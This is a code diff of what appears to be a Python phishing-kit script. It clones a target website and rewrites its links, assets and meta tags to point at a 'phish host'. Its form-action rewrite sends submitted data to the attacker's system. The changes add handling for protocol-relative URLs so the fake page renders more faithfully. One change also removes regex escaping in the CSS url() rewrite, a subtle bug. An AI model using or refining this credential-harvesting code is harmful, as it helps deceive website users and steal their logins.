@@ -100,7 +100,7 @@ for linkonsub in soup.find_all('a', {"onsubmit":True}):
 for link in soup.find_all('a'):
   if link.get('href') is not None and re.search('^#', link.get('href')) is None:
     if re.search('^javascript\:', link.get('href')) is None:
-      if re.search('^(mailto|http|https|#$)', link.get('href')) is None:
+      if re.search('^(mailto|http|https|//|#$)', link.get('href')) is None:
         if re.search('^\/', link.get('href')):  
           link['href'] = htype+'://'+domainget+link.get('href')
         else:
@@ -111,7 +111,7 @@ for link in soup.find_all('a'):
 # Loop through all images found in HTML response, 
 # replace with full link to image on phish host
 for img in soup.find_all('img'):
-  if re.search('^(http|https)', img.get('src')) is None:
+  if re.search('^(http|https|//)', img.get('src')) is None:
     if re.search('^\/', img.get('src')): 
       img['src'] = htype+'://'+domainget+img.get('src')
     else:
@@ -120,7 +120,7 @@ for img in soup.find_all('img'):
 # Loop through all style link tags found in HTML response, 
 # replace with full link to css file on phish host
 for styler in soup.find_all('link'):
-  if re.search('^(http|https)', styler.get('href')) is None:
+  if re.search('^(http|https|//)', styler.get('href')) is None:
     if re.search('^\/', styler.get('href')):
       styler['href'] = htype+'://'+domainget+styler.get('href')
     else:
@@ -129,7 +129,7 @@ for styler in soup.find_all('link'):
 # Loop through all script tags found in HTML response, 
 # replace with full link to script on phish host
 for scripter in soup.find_all('script', {"src":True}):
-  if re.search('^(http|https)', scripter.get('src')) is None:
+  if re.search('^(http|https|//)', scripter.get('src')) is None:
     if re.search('^\/', scripter.get('src')): 
       scripter['src'] = htype+'://'+domainget+scripter.get('src')
     else:
@@ -138,7 +138,7 @@ for scripter in soup.find_all('script', {"src":True}):
 # Loop through all embed tags found in HTML response, 
 # replace with full link to script on phish host
 for embedded in soup.find_all('embed', {"src":True}):
-  if re.search('^(http|https)', embedded.get('src')) is None:
+  if re.search('^(http|https|//)', embedded.get('src')) is None:
     if re.search('^\/', embedded.get('src')): 
       embedded['src'] = htype+'://'+domainget+embedded.get('src')
     else:
@@ -147,7 +147,7 @@ for embedded in soup.find_all('embed', {"src":True}):
 # Loop through all param tags found in HTML response, 
 # replace with full link to script on phish host
 for paramval in soup.find_all('param', {"value":True}):
-  if re.search('^(http|https)', paramval.get('value')) is None:
+  if re.search('^(http|https|//)', paramval.get('value')) is None:
     if re.search('^\/', paramval.get('value')): 
       paramval['src'] = htype+'://'+domainget+paramval.get('value')
     else:
@@ -156,7 +156,7 @@ for paramval in soup.find_all('param', {"value":True}):
 # Loop through all meta tags found in HTML response, 
 # replace with full link to phish host
 for meta in soup.find_all('meta', {"content":True}):
-  if re.search('^(http|https)', meta.get('content')) is None:
+  if re.search('^(http|https|//)', meta.get('content')) is None:
     if re.search('^\/', meta.get('content')) and re.search('\.', meta.get('content')): 
       meta['content'] = htype+'://'+domainget+meta.get('content')
     elif re.search('\.', meta.get('content')):
@@ -177,7 +177,7 @@ for inputkeypress in soup.find_all('input', {"onkeypress":True}):
 # Loop through all input tags found in HTML response, 
 # replace src with full link to script on phish host
 for inputer in soup.find_all('input', {"src":True}):
-  if re.search('^(http|https)', inputer.get('src')) is None:
+  if re.search('^(http|https|//)', inputer.get('src')) is None:
     if re.search('^\/', inputer.get('src')): 
       inputer['src'] = htype+'://'+domainget+inputer.get('src')
     else:
@@ -194,7 +194,7 @@ for formkeypress in soup.find_all('form', {"onkeypress":True}):
 # Loop through all forms found in HTML response, 
 # replace action with our attacking system
 for form in soup.find_all('form'):
-  if re.search('^(http|https)', form.get('action')) is None:
+  if re.search('^(http|https|//)', form.get('action')) is None:
     if re.search('^\/', form.get('action')): 
       form['action'] = stype+'://'+hostget+form.get('action')
     else:
@@ -237,10 +237,11 @@ for urls in urlCSS:
     urlValue = str(urls)
   
   # If preceeded by a forward slash, remove make sure we do not double slash
-  if re.search('^\/', urls):
-    phishHtml = re.sub('url\('+re.escape(str(urls))+'\)', 'url('+useQuotes+phishget[:-1]+urlValue+useQuotes+')', phishHtml)
-  else:
-    phishHtml = re.sub('url\('+re.escape(str(urls))+'\)', 'url('+useQuotes+phishget+urlValue+useQuotes+')', phishHtml)
+  if re.search('^(http|https|//)', urls) is None:
+    if re.search('^\/', urls):
+      phishHtml = re.sub('url\('+str(urls)+'\)', 'url('+useQuotes+phishget[:-1]+urlValue+useQuotes+')', phishHtml)
+    else:
+      phishHtml = re.sub('url\('+str(urls)+'\)', 'url('+useQuotes+phishget+urlValue+useQuotes+')', phishHtml)
 
 phishWrite = open(phishfile, 'w')
 phishWrite.write(phishHtml)
